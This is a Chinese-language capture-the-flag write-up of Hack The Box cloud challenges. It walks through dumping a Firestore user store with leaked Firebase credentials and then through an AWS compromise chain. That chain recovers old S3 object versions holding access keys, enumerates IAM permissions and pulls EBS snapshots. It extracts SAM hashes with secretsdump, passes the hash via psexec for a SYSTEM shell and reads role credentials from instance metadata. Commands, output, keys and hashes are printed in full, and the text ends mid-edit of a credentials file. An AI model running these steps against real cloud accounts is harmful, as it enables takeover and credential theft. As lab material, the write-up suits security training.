也就是说，firebase 就是一个连接云平台和开发者业务的东西，拿到连接凭证后，就自然可以调用 firebase 和 GCP 的接口了。当然 firebase 这些接口 gcloud cli 工具几乎是没提供，需要通过 firebase 提供的 SDK 去调，这样方便开发在开发业务逻辑时调用。

db.js 已经写好了数据库连接逻辑，我们复用即可

```jsx
const { initializeApp, applicationDefault, cert } = require('firebase-admin/app');
const { getFirestore, Timestamp, FieldValue } = require('firebase-admin/firestore');

const serviceAccount = require('./firestore.json');
    
initializeApp({
    credential: cert(serviceAccount)
});

const db = getFirestore();

module.exports = db;

```

回到题目最开始，我们需要登录账号密码，那么这些按理说数据库是有存的。

[https://firebase.google.com/docs/firestore](https://firebase.google.com/docs/firestore)

firebase 的数据存储是使用 firestore，是非关系型数据库，我们可以先找数据库，不过这里没有库的概念，最上层是 collection

代码中 [getFirestore()](https://firebase.google.com/docs/reference/js/firestore_.md#getfirestore) 返回 `Firestore` 对象，[https://googleapis.dev/nodejs/firestore/latest/Firestore.html](https://googleapis.dev/nodejs/firestore/latest/Firestore.html)  提供 `listCollections()` 可以查看所有 collection

先进入到 cloudvault-dev-files 路径，安装一下依赖

```jsx
npm install
```

在 config 目录下新建 list.js 内容为

```jsx
const { initializeApp, cert } = require('firebase-admin/app');
const { getFirestore } = require('firebase-admin/firestore');

const serviceAccount = require('./firestore.json');
    
initializeApp({
    credential: cert(serviceAccount)
});

const db = getFirestore();

db.listCollections().then(collections => {
    for (let collection of collections) {
      console.log(`Found collection with id: ${collection.id}`);
    }
}).catch(error => console.error(error));

```

运行，找到个 `vault_user_store` collection

```bash
> node config/list.js

Found collection with id: vault_user_store
```

补上获取数据部分逻辑

```jsx
const { initializeApp, cert } = require('firebase-admin/app');
const { getFirestore } = require('firebase-admin/firestore');

const serviceAccount = require('./firestore.json');
    
initializeApp({
    credential: cert(serviceAccount)
});

const db = getFirestore();

db.listCollections().then(collections => {
    for (let collection of collections) {
      console.log(`Found collection with id: ${collection.id}`);

      collection.get().then(documentSnapshot => {
        documentSnapshot.forEach(doc => {
          console.log(doc.id, '=>', doc.data());
        });
      });
    }
}).catch(error => console.error(error));

```

运行输出

```jsx
> node config/list.js

Found collection with id: vault_user_store
sppPjk7IpkrtQyfJ0IXC => {
  password: '$2a$04$sJkZ52ZZVT/MnH6SWxRnUuC0ZRTeAn7kqMGftXghlU0qSqLGVy6.q',
  secret: 'KZZXERL4OFNHW6TBJQ7GKIJM',
  username: 'maximus',
  id: 1
}
```

这下就差个密码了，密码是哈希过的，结合前面的 backup-key 其中第一个就是密码明文，然后 secret 是 totp 二步验证的密钥。然后去一开始的站点用账号密码登录后，在输入二步验证码就拿到 flag 了

![Untitled](image/2024-05-28/Untitled%206.png)

> HTB{th3_v4ULt_1s_0n_f1r3!}
> 

其实这里上面可以看出，写这个脚本，又要对数据类型，又要看文档以及理解他相关代码，又要匹配 collection、document 啥的，eson师傅说不如直接导出 firestore 的 backup 这样就简单粗暴些，不用自己看文档写代码了，毕竟他就是个数据库，但 

[https://firebase.google.com/docs/firestore/manage-data/export-import#gcloud](https://firebase.google.com/docs/firestore/manage-data/export-import#gcloud) 

官方提供的方法只能导出到谷歌存储里，不能直接下载

网上找找这种备份项目就好了，比如 https://github.com/steadyequipment/node-firestore-backup，就是不过项目他现在用有点问题，会报错 `this.options.database.getCollections is not a function`，就是现在不是叫 `getCollections`，而是叫 `listCollections()`，dist/firestore.js 有两处，改过来运行就好了

```bash
> node bin/firestore-backup.js -a firestore.json -B .

Starting backup...
Backing up Collection '/vault_user_store'
Backing up Document '/vault_user_store/sppPjk7IpkrtQyfJ0IXC'
All done 💫
backuptime: 2.858s
```

![Untitled](image/2024-05-28/Untitled%207.png)

当然，总有一些工具或者脚本不用改就能用的

## 0x05 Asceticism

> Upon thorough investigation, we have come across AWS Identity and Access Management (IAM) keys within a publicly accessible Git repository. Our initial suspicion is that these keys are associated with Vault11. However, we are seeking further clarification and confirmation on this matter. We kindly request your assistance in delving deeper into the situation to ascertain the precise ownership of these keys and to explore potential strategies for internally addressing any security vulnerabilities they may pose.
> 

[cloud_asceticism.zip](image/2024-05-28/cloud_asceticism.zip)

附件也是给了个 AKSK 

| Access key ID | Secret access key | Region Name |
| --- | --- | --- |
| AKIAXYAFLIG2DFBKVWHJ | AyOOKTDrBkaHCaaGuLKlD8VNlJvfp8T/f8k/D7+U | us-east-1 |

enumerate-iam 并没有枚举出有用的权限，神奇了，按理说是可以的，eson 师傅说比赛时可以正常枚举权限，可能是 After Party 环境改了啥东西

```bash
> aws s3 ls 

An error occurred (AccessDenied) when calling the ListBuckets operation: Access Denied
```

先继续，假设 ls 到了 vault11-reports 桶，里面有个 flag.txt

```bash
> aws s3 ls --recursive s3://vault11-reports
2024-05-07 22:07:25         43 flag/flag.txt
```

但拿不下来

```bash
> aws s3 cp s3://vault11-reports/flag/flag.txt .

download failed: s3://vault11-reports/flag/flag.txt to ./flag.txt An error occurred (AccessDenied) when calling the GetObject operation: User: arn:aws:iam::532587168180:user/kstone-dev is not authorized to perform: kms:Decrypt on resource: arn:aws:kms:us-east-1:532587168180:key/d24c4a28-7014-4d49-a6c2-c4f86a68945d because no identity-based policy allows the kms:Decrypt action
```

由于桶里没有其他内容，可以考虑看看桶有没有启用版本控制

```bash
> aws s3api list-object-versions --bucket vault11-reports

{
    "ETag": "\"d6e420ebcdf3c9a7104b7f8a2e394749\"",
    "Size": 94,
    "StorageClass": "STANDARD",
    "Key": "snapper_accessKeys.csv",
    "VersionId": "O_Ybx9qvdhhJgdcuaeQNBXy9weknoyIi",
    "IsLatest": false,
    "LastModified": "2024-05-07T14:07:25+00:00",
    "Owner": {
        "DisplayName": "cloudchalls",
        "ID": "68fd0ca8813f6724859c6784d15f5d36a5dbb1965be025a4269b571ee1243500"
    }
}
```

发现一个 csv 文件，拿下来

```bash
> aws s3api get-object --bucket vault11-reports --key snapper_accessKeys.csv --version-id O_Ybx9qvdhhJgdcuaeQNBXy9weknoyIi snapper_accessKeys.csv
```

发现一个 AKSK

| Access key ID | Secret access key |
| --- | --- |
| AKIAXYAFLIG2CSJQ4R5Y | BGTlUZBVjhdydUk9AMMG+X5b+1fzsvdstY8xVet6 |

枚举一下权限

```bash
> python3.11 enumerate-iam.py --access-key AKIAXYAFLIG2CSJQ4R5Y --secret-key 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

2024-05-26 13:27:43,303 - 76585 - [INFO] Starting permission enumeration for access-key-id "AKIAXYAFLIG2CSJQ4R5Y"
2024-05-26 13:27:44,786 - 76585 - [INFO] -- Account ARN : arn:aws:iam::532587168180:user/snapper
2024-05-26 13:27:44,786 - 76585 - [INFO] -- Account Id  : 532587168180
2024-05-26 13:27:44,786 - 76585 - [INFO] -- Account Path: user/snapper
2024-05-26 13:27:45,013 - 76585 - [INFO] Attempting common-service describe / list brute force.
2024-05-26 13:27:53,068 - 76585 - [INFO] -- sts.get_session_token() worked!
2024-05-26 13:27:53,290 - 76585 - [INFO] -- sts.get_caller_identity() worked!
2024-05-26 13:27:57,861 - 76585 - [INFO] -- ec2.describe_instances() worked!
2024-05-26 13:28:00,067 - 76585 - [INFO] -- dynamodb.describe_endpoints() worked!
2024-05-26 13:36:22,929 - 76585 - [INFO] -- ec2.describe_snapshots() worked!
```

查看ec2实例和快照权限

- `> aws ec2 describe-instances`
    
    ```json
    
    {
        "Reservations": [
            {
                "Groups": [],
                "Instances": [
                    {
                        "AmiLaunchIndex": 0,
                        "ImageId": "ami-0a62069ec7788c8be",
                        "InstanceId": "i-0e5dabca0fa9f222f",
                        "InstanceType": "t2.medium",
                        "KeyName": "felamos",
                        "LaunchTime": "2024-05-07T15:23:42+00:00",
                        "Monitoring": {
                            "State": "disabled"
                        },
                        "Placement": {
                            "AvailabilityZone": "us-east-1d",
                            "GroupName": "",
                            "Tenancy": "default"
                        },
                        "Platform": "windows",
                        "PrivateDnsName": "ip-172-31-93-160.ec2.internal",
                        "PrivateIpAddress": "172.31.93.160",
                        "ProductCodes": [],
                        "PublicDnsName": "ec2-54-208-244-117.compute-1.amazonaws.com",
                        "PublicIpAddress": "54.208.244.117",
                        "State": {
                            "Code": 16,
                            "Name": "running"
                        },
                        "StateTransitionReason": "",
                        "SubnetId": "subnet-0a5022ff1dfdf5518",
                        "VpcId": "vpc-0d7b2c5c8509574bd",
                        "Architecture": "x86_64",
                        "BlockDeviceMappings": [
                            {
                                "DeviceName": "/dev/sda1",
                                "Ebs": {
                                    "AttachTime": "2024-05-07T14:07:29+00:00",
                                    "DeleteOnTermination": true,
                                    "Status": "attached",
                                    "VolumeId": "vol-0ed252fb0ff6d55cf"
                                }
                            },
                            {
                                "DeviceName": "/dev/xvdb",
                                "Ebs": {
                                    "AttachTime": "2024-05-07T14:08:25+00:00",
                                    "DeleteOnTermination": false,
                                    "Status": "attached",
                                    "VolumeId": "vol-075ee6a3f4c846e85"
                                }
                            }
                        ],
                        "ClientToken": "terraform-20240507140721457700000006",
                        "EbsOptimized": false,
                        "EnaSupport": true,
                        "Hypervisor": "xen",
                        "IamInstanceProfile": {
                            "Arn": "arn:aws:iam::532587168180:instance-profile/WindowsVM-KMS",
                            "Id": "AIPAXYAFLIG2AFHEWFQRZ"
                        },
                        "NetworkInterfaces": [
                            {
                                "Association": {
                                    "IpOwnerId": "amazon",
                                    "PublicDnsName": "ec2-54-208-244-117.compute-1.amazonaws.com",
                                    "PublicIp": "54.208.244.117"
                                },
                                "Attachment": {
                                    "AttachTime": "2024-05-07T14:07:28+00:00",
                                    "AttachmentId": "eni-attach-0d7e27209eb92dd1a",
                                    "DeleteOnTermination": true,
                                    "DeviceIndex": 0,
                                    "Status": "attached",
                                    "NetworkCardIndex": 0
                                },
                                "Description": "",
                                "Groups": [
                                    {
                                        "GroupName": "default",
                                        "GroupId": "sg-0b563effdfa72bdfa"
                                    }
                                ],
                                "Ipv6Addresses": [],
                                "MacAddress": "12:c9:45:34:ce:dd",
                                "NetworkInterfaceId": "eni-02abef5d6c2dc4c8e",
                                "OwnerId": "532587168180",
                                "PrivateDnsName": "ip-172-31-93-160.ec2.internal",
                                "PrivateIpAddress": "172.31.93.160",
                                "PrivateIpAddresses": [
                                    {
                                        "Association": {
                                            "IpOwnerId": "amazon",
                                            "PublicDnsName": "ec2-54-208-244-117.compute-1.amazonaws.com",
                                            "PublicIp": "54.208.244.117"
                                        },
                                        "Primary": true,
                                        "PrivateDnsName": "ip-172-31-93-160.ec2.internal",
                                        "PrivateIpAddress": "172.31.93.160"
                                    }
                                ],
                                "SourceDestCheck": true,
                                "Status": "in-use",
                                "SubnetId": "subnet-0a5022ff1dfdf5518",
                                "VpcId": "vpc-0d7b2c5c8509574bd",
                                "InterfaceType": "interface"
                            }
                        ],
                        "RootDeviceName": "/dev/sda1",
                        "RootDeviceType": "ebs",
                        "SecurityGroups": [
                            {
                                "GroupName": "default",
                                "GroupId": "sg-0b563effdfa72bdfa"
                            }
                        ],
                        "SourceDestCheck": true,
                        "Tags": [
                            {
                                "Key": "Name",
                                "Value": "Vault11-WS01"
                            }
                        ],
                        "VirtualizationType": "hvm",
                        "CpuOptions": {
                            "CoreCount": 2,
                            "ThreadsPerCore": 1
                        },
                        "CapacityReservationSpecification": {
                            "CapacityReservationPreference": "open"
                        },
                        "HibernationOptions": {
                            "Configured": false
                        },
                        "MetadataOptions": {
                            "State": "applied",
                            "HttpTokens": "optional",
                            "HttpPutResponseHopLimit": 1,
                            "HttpEndpoint": "enabled",
                            "HttpProtocolIpv6": "disabled",
                            "InstanceMetadataTags": "disabled"
                        },
                        "EnclaveOptions": {
                            "Enabled": false
                        },
                        "PlatformDetails": "Windows",
                        "UsageOperation": "RunInstances:0002",
                        "UsageOperationUpdateTime": "2024-05-07T14:07:28+00:00",
                        "PrivateDnsNameOptions": {
                            "HostnameType": "ip-name",
                            "EnableResourceNameDnsARecord": false,
                            "EnableResourceNameDnsAAAARecord": false
                        },
                        "MaintenanceOptions": {
                            "AutoRecovery": "default"
                        },
                        "CurrentInstanceBootMode": "legacy-bios"
                    }
                ],
                "OwnerId": "532587168180",
                "ReservationId": "r-062728f84e63857da"
            }
        ]
    }
    ```
    

一些有用的信息汇总，和一开始我们想 cp flag 报错 KMS 有点关系

- Window 机器，ARN 的资源id是 WindowsVM-KMS
- 挂载着两块硬盘
- 主机 iam 绑定

```json
"IamInstanceProfile": {
	"Arn": "arn:aws:iam::532587168180:instance-profile/WindowsVM-KMS",
	"Id": "AIPAXYAFLIG2AFHEWFQRZ"
}
```

- 公网连接信息

```json
"PublicDnsName": "ec2-54-208-244-117.compute-1.amazonaws.com",
"PublicIp": "54.208.244.117"
```

查看快照信息

```bash
aws ec2 describe-snapshots
```

执行的贼慢，而且等了很久后发现贼大，看了下文档 [https://awscli.amazonaws.com/v2/documentation/api/latest/reference/ec2/describe-snapshots.html](https://awscli.amazonaws.com/v2/documentation/api/latest/reference/ec2/describe-snapshots.html) 

发现默认会把 aws 公共的快照也弄下来

这时我们需要 filter 一下，比如 

- `owner-id` - The Amazon Web Services account ID of the owner. We recommend that you use the related parameter instead of this filter.

`> aws ec2 describe-snapshots --owner-id self` 

```json
{
    "Snapshots": [
        {
            "Description": "Created by CreateImage(i-0e5dabca0fa9f222f) for ami-041b49e5f82651d16",
            "Encrypted": false,
            "OwnerId": "532587168180",
            "Progress": "100%",
            "SnapshotId": "snap-04d68f6296b5893de",
            "StartTime": "2024-05-08T10:08:05.509000+00:00",
            "State": "completed",
            "VolumeId": "vol-0ed252fb0ff6d55cf",
            "VolumeSize": 30,
            "StorageTier": "standard"
        },
        {
            "Description": "Created by CreateImage(i-0e5dabca0fa9f222f) for ami-041b49e5f82651d16",
            "Encrypted": false,
            "OwnerId": "532587168180",
            "Progress": "100%",
            "SnapshotId": "snap-09a2dac60106057d8",
            "StartTime": "2024-05-08T10:08:05.509000+00:00",
            "State": "completed",
            "VolumeId": "vol-075ee6a3f4c846e85",
            "VolumeSize": 1,
            "StorageTier": "standard"
        },
        {
            "Description": "Windows Backup Drive Snapshot",
            "Encrypted": false,
            "OwnerId": "532587168180",
            "Progress": "100%",
            "SnapshotId": "snap-00197900d5ed8277e",
            "StartTime": "2024-05-07T15:11:58.748000+00:00",
            "State": "completed",
            "VolumeId": "vol-075ee6a3f4c846e85",
            "VolumeSize": 1,
            "Tags": [
                {
                    "Key": "Name",
                    "Value": "Backup"
                }
            ],
            "StorageTier": "standard"
        }
    ]
}
```

或者是先获取 Account ID，然后获取，结果是一样的

```bash
> aws sts get-caller-identity

{
    "UserId": "AIDAXYAFLIG2MDXEPN7XP",
    "Account": "532587168180",
    "Arn": "arn:aws:iam::532587168180:user/snapper"
}
```

都是获取自己的  Account ID 下的快照

```bash
> aws ec2 describe-snapshots --filters Name=owner-id,Values=532587168180
```

一共有 3 个快照，磁盘对应关系

- "VolumeId": "vol-075ee6a3f4c846e85"  <=> /dev/xvdb
- "VolumeId": "vol-0ed252fb0ff6d55cf" <=> /dev/sda1

Windows Backup Drive Snapshot 这个快照名看起来比较特别，先分析它

用 https://github.com/RhinoSecurityLabs/dsnap 来获取 EBS 的快照，先安装

```bash
> python3 -m pip install 'dsnap[cli]'
```

查看快照列表（不用配置 AKSK，直接用即可，因为会自动读取 `aws configure` 配置的）

```bash
> dsnap list
           Id          |   Owneer ID   | Description
snap-04d68f6296b5893de   532587168180   Created by CreateImage(i-0e5dabca0fa9f222f) for ami-041b49e5f82651d16
snap-09a2dac60106057d8   532587168180   Created by CreateImage(i-0e5dabca0fa9f222f) for ami-041b49e5f82651d16
snap-00197900d5ed8277e   532587168180   Windows Backup Drive Snapshot
```

下载快照

```bash
> dsnap get snap-00197900d5ed8277e

Selected snapshot with id snap-00197900d5ed8277e
Output Path: ..../snap-00197900d5ed8277e.img
Truncating file to 1.0 GB
```

这种快照 volatility 分析不了，可以用 

[libguestfs, library for accessing and modifying VM disk images](https://libguestfs.org/)

debian系 系统装起来更方便，直接 apt 就能装

```bash
apt install libguestfs-tools
```

装好后，-a，`--add IMAGE` ，run 为加载镜像，list-filesystems 查看文件系统类型，这些在 `man` 中都有，然后把 /dev/sda1 挂载到当前 shell，翻文件翻到快照的虚拟磁盘文件 vhdx（Hyper-v 的 Virtual Hard Disk v2）

```bash
> guestfish -a snap-00197900d5ed8277e.img

Welcome to guestfish, the guest filesystem shell for
editing virtual machine filesystems and disk images.

Type: ‘help’ for help on commands
      ‘man’ to read the manual
      ‘quit’ to quit the shell

><fs> run
 100% ⟦▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒⟧ 00:00
><fs> list-filesystems
/dev/sda1: ntfs
><fs> mount /dev/sda1 /
><fs> ll /
total 8
drwxrwxrwx  1 0 0 4096 May  7 15:10 .
drwxr-xr-x 15 0 0 4096 May 26 13:40 ..
drwxrwxrwx  1 0 0    0 May  7 15:05 System Volume Information
drwxrwxrwx  1 0 0    0 May  7 15:10 WindowsImageBackup

><fs> ll '/WindowsImageBackup'
total 4
drwxrwxrwx 1 0 0    0 May  7 15:10 .
drwxrwxrwx 1 0 0 4096 May  7 15:10 ..
drwxrwxrwx 1 0 0    0 May  7 15:11 EC2AMAZ-QLP7LVM

# 这里的 EC2AMAZ-QLP7LVM 为 Windows 主机名
><fs> ll '/WindowsImageBackup/EC2AMAZ-QLP7LVM'
total 5
drwxrwxrwx 1 0 0    0 May  7 15:11 .
drwxrwxrwx 1 0 0    0 May  7 15:10 ..
drwxrwxrwx 1 0 0 4096 May  7 15:11 Backup 2024-05-07 151007
drwxrwxrwx 1 0 0    0 May  7 15:10 Catalog
drwxrwxrwx 1 0 0    0 May  7 15:11 Logs
-rwxrwxrwx 1 0 0   16 May  7 15:10 MediaId

><fs> ll '/WindowsImageBackup/EC2AMAZ-QLP7LVM/Backup 2024-05-07 151007'
total 566384
drwxrwxrwx 1 0 0      4096 May  7 15:11 .
drwxrwxrwx 1 0 0         0 May  7 15:11 ..
-rwxrwxrwx 1 0 0 574619648 May  7 15:11 9546e6c7-0000-0000-0000-100000000000.vhdx
-rwxrwxrwx 1 0 0      1126 May  7 15:10 BackupSpecs.xml
-rwxrwxrwx 1 0 0       776 May  7 15:10 cbf50813-4594-4ba6-8266-c076ed7c396e_AdditionalFilesc3b9f3c7-5e52-4d5e-8b20-19adc95a34c7.xml
-rwxrwxrwx 1 0 0      4078 May  7 15:11 cbf50813-4594-4ba6-8266-c076ed7c396e_Components.xml
-rwxrwxrwx 1 0 0      4308 May  7 15:10 cbf50813-4594-4ba6-8266-c076ed7c396e_RegistryExcludes.xml
-rwxrwxrwx 1 0 0      3138 May  7 15:10 cbf50813-4594-4ba6-8266-c076ed7c396e_Writer0bada1de-01a9-4625-8278-69e735f39dd2.xml
-rwxrwxrwx 1 0 0      2128 May  7 15:10 cbf50813-4594-4ba6-8266-c076ed7c396e_Writer4dc3bdd4-ab48-4d07-adb0-3bee2926fd7f.xml
-rwxrwxrwx 1 0 0      1488 May  7 15:10 cbf50813-4594-4ba6-8266-c076ed7c396e_Writer542da469-d3e1-473c-9f4f-7847f01fc64f.xml
-rwxrwxrwx 1 0 0      1628 May  7 15:10 cbf50813-4594-4ba6-8266-c076ed7c396e_Writer75dfb225-e2e4-4d39-9ac9-ffaff65ddf06.xml
-rwxrwxrwx 1 0 0      1484 May  7 15:10 cbf50813-4594-4ba6-8266-c076ed7c396e_Writera6ad56c2-b509-4e6c-bb19-49d8f43532f0.xml
-rwxrwxrwx 1 0 0      2940 May  7 15:10 cbf50813-4594-4ba6-8266-c076ed7c396e_Writerafbab4a2-367d-4d15-a586-71dbb18f8485.xml
-rwxrwxrwx 1 0 0      4400 May  7 15:10 cbf50813-4594-4ba6-8266-c076ed7c396e_Writerbe000cbe-11fe-4426-9c58-531aa6355fc4.xml
-rwxrwxrwx 1 0 0      1746 May  7 15:10 cbf50813-4594-4ba6-8266-c076ed7c396e_Writerd61d61c8-d73a-4eee-8cdd-f6f9786b7124.xml
-rwxrwxrwx 1 0 0   5294762 May  7 15:10 cbf50813-4594-4ba6-8266-c076ed7c396e_Writere8132975-6f93-4464-a53e-1050253ae220.xml

><fs> copy-out '/WindowsImageBackup/EC2AMAZ-QLP7LVM/Backup 2024-05-07 151007/9546e6c7-0000-0000-0000-100000000000.vhdx' /root/
 100% ⟦▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒⟧ 00:00
><fs>
```

退出 guestfish 交互 shell，查看虚拟磁盘文件的类型

```bash
> file 9546e6c7-0000-0000-0000-100000000000.vhdx

9546e6c7-0000-0000-0000-100000000000.vhdx: Microsoft Disk Image eXtended, by Microsoft Windows 10.0.17763.0, sequence 0xa, NO Log Signature; region, 2 entries, id BAT, at 0x300000, Required 1, id Metadata, at 0x200000, Required 1
```

有磁盘文件的了，然后实例是Windows，翻翻以前打域的笔记，直奔拿 SAM

```bash
> guestfish -a 9546e6c7-0000-0000-0000-100000000000.vhdx

Welcome to guestfish, the guest filesystem shell for
editing virtual machine filesystems and disk images.

Type: ‘help’ for help on commands
      ‘man’ to read the manual
      ‘quit’ to quit the shell

><fs> run
 100% ⟦▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒⟧ --:--
><fs> list-filesystems
/dev/sda2: ntfs
><fs> mount /dev/sda2 /
><fs> ll /
total 16
drwxrwxrwx  1 0 0 4096 May  7 13:53 .
drwxr-xr-x 15 0 0 4096 May 26 14:03 ..
drwxrwxrwx  1 0 0 8192 Apr 10 04:12 Boot
drwxrwxrwx  1 0 0    0 Nov 14  2018 EFI
drwxrwxrwx  1 0 0    0 May  7 13:54 Windows

><fs> ll /Windows/System32/config | grep -E "SAM|SYSTEM"
-rwxrwxrwx 1 0 0    65536 May  7 13:57 SAM
....
-rwxrwxrwx 1 0 0 17039360 May  7 13:57 SYSTEM

><fs> copy-out /Windows/System32/config/SAM /root
><fs> copy-out /Windows/System32/config/SYSTEM /root
><fs> copy-out /Windows/System32/config/SECURITY /root
```

然后本地 dump 哈希（~~用mac或linux的师傅可千万别像WP专门开个win机子把 vhdx 放 win 里面弄.jpg~~）

```bash
> secretsdump.py -sam ./SAM -system ./SYSTEM -security ./SECURITY LOCAL
Impacket v0.10.1.dev1+20230216.13520.d4c06e7f - Copyright 2022 Fortra

[*] Target system bootKey: 0x1bb6cbe6d4904d937f3a7538946c1634
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0b4781dad49c808c37bf3491dec3df91:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:58f8e0214224aebc2c5f82fb7cb47ca1:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] DPAPI_SYSTEM
dpapi_machinekey:0x951254f751a98ef0e51bfff7783a4f944e735be6
dpapi_userkey:0x56339180d42be8c236762804e80c758af2f21e40
[*] NL$KM
 0000   8D D2 8E 67 54 58 89 B1  C9 53 B9 5B 46 A2 B3 66   ...gTX...S.[F..f
 0010   D4 3B 95 80 92 7D 67 78  B7 1D F9 2D A5 55 B7 A3   .;...}gx...-.U..
 0020   61 AA 4D 86 95 85 43 86  E3 12 9E C4 91 CF 9A 5B   a.M...C........[
 0030   D8 BB 0D AE FA D3 41 E0  D8 66 3D 19 75 A2 D1 B2   ......A..f=.u...
NL$KM:8dd28e67545889b1c953b95b46a2b366d43b9580927d6778b71df92da555b7a361aa4d8695854386e3129ec491cf9a5bd8bb0daefad341e0d8663d1975a2d1b2
[*] Cleaning up...
```

NTLM哈希传递拿下 AWS 的实例

```bash
> psexec.py -hashes :0b4781dad49c808c37bf3491dec3df91 Administrator@54.208.244.117

Impacket v0.10.1.dev1+20230216.13520.d4c06e7f - Copyright 2022 Fortra

[*] Requesting shares on 54.208.244.117.....
[*] Found writable share ADMIN$
[*] Uploading file wSNlSthy.exe
[*] Opening SVCManager on 54.208.244.117.....
[*] Creating service iSGU on 54.208.244.117.....
[*] Starting service iSGU.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.5696]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32>
```

来桌面看看有没有密码本.txt

```bash
cd c:\Users\administrator\desktop

c:\Users\Administrator\Desktop> dir
 Volume in drive C has no label.
 Volume Serial Number is 7223-8A78

 Directory of c:\Users\Administrator\Desktop

05/22/2024  03:32 PM    <DIR>          .
05/22/2024  03:32 PM    <DIR>          ..
05/07/2024  03:31 PM             1,125 backup.ps1.enc
05/22/2024  08:50 AM                 8 Can_i_have_a_help
06/21/2016  03:36 PM               527 EC2 Feedback.website
06/21/2016  03:36 PM               554 EC2 Microsoft Windows Guide.website
05/20/2024  06:37 PM               290 NOTE.txt
               5 File(s)          2,504 bytes
               2 Dir(s)   6,606,770,176 bytes free

```

有个内容加密过的东西 `backup.ps1.enc` 

前面 describe instance 的时候这个实例有绑定 iam，访问下元数据，不知道我这里为啥访问不了，直接超时，试了很多次都是这样，v1 v2版本都试了，powershell 也是

```bash
C:\> curl --connect-timeout 2 http://169.254.169.254/latest/meta-data/
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:--  0:00:49 --:--:--     0
curl: (28) Connection time-out

PS C:\> curl -TimeoutSec 2 http://169.254.169.254/latest/meta-data/

curl : The response content cannot be parsed because the Internet Explorer engine is not available, or Internet
Explorer's first-launch configuration is not complete. Specify the UseBasicParsing parameter and try again.
At line:1 char:1
+ curl -TimeoutSec 2 http://169.254.169.254/latest/meta-data/
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotImplemented: (:) [Invoke-WebRequest], NotSupportedException
    + FullyQualifiedErrorId : WebCmdletIEDomNotSupportedException,Microsoft.PowerShell.Commands.InvokeWebRequestComman
   d

PS C:\>
```

问了下 eson 师傅，原来是 Windows 的特性，因为返回的不是标准的 HTML 格式，但 Windows 下会默认以 *MSHTML*（Microsoft *HTML*）解析，然后解析不了导致超时报错。原来上面报错有写，一心想着超时，没注意到，以为是请求问题

> By default, script code in the web page may be run when the page is being parsed to populate the `ParsedHtml` property. Use the `-UseBasicParsing` switch to suppress this.
> 

加上  `-UseBasicParsing` 参数即可，这里用 [Invoke-WebRequest](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.4)

```abap
C:\> powershell # 输入后记得按一下回车
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\>

PS C:\> Invoke-WebRequest  http://169.254.169.254/latest/meta-data/ -TimeoutSec 2 -UseBasicParsing

StatusCode        : 200
StatusDescription : OK
Content           : ami-id
                    ami-launch-index
                    ami-manifest-path
                    block-device-mapping/
                    events/
                    hibernation/
                    hostname
                    iam/
                    identity-credentials/
                    instance-action
                    instance-id
                    instance-life-cycle
                    instance-type
                    local-hostname
                    lo...
RawContent        : HTTP/1.0 200 OK
                    Connection: keep-alive
                    Accept-Ranges: bytes
                    Content-Length: 338
                    Content-Type: text/plain
                    Date: Mon, 27 May 2024 04:38:33 GMT
                    Last-Modified: Mon, 20 May 2024 13:55:59 GMT
                    Server:...
Forms             :
Headers           : {[Connection, keep-alive], [Accept-Ranges, bytes], [Content-Length, 338], [Content-Type,
                    text/plain]...}
Images            : {}
InputFields       : {}
Links             : {}
ParsedHtml        :
RawContentLength  : 338

```

继续获取 sts

```powershell
PS C:\> Invoke-WebRequest http://169.254.169.254/latest/meta-data/iam/security-credentials/ -TimeoutSec 2 -UseBasicParsing

PS C:\> Invoke-WebRequest http://169.254.169.254/latest/meta-data/iam/security-credentials/KMSRoleWin -TimeoutSec 2 -UseBasicParsing
```

然后枚举权限

```bash
> python3 enumerate-iam.py --access-key ASIAXYAFLIG2MNAYNCIQ --secret-key tcjyvVvTU6wCpSy7o10BEBTIewfcKu1JRnRN4cSI --session-token IQoJb3JpZ2luX....

....
[INFO] -- kms.list_keys() worked!
[INFO] -- kms.list_aliases() worked!
```

有 kms 的查看 keys 权限

手动改下本机的 `~/.aws/credentials`

```
[default]
aws_access_key_id = ASIAXYAFLIG2MNAYNCIQ
